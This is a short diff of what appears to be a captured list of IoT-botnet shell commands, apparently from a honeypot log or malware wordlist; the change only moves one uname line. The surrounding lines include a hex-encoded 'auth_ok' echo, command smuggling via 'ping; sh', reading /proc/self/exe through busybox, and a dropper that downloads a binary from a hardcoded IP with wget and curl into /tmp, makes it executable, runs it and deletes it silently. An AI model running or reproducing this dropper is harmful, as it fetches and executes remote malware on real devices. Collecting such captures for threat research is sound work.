@@ -35,9 +35,9 @@ echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
 id
 &k`g&k|zpkfq)ES[M
 g & k | zpkfq
+/bin/./uname -s -v -n -r -m
 ping; sh
 uname -a
-/bin/./uname -s -v -n -r -m
 /bin/busybox cat /proc/self/exe || cat /proc/self/exe
 exit
 (cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
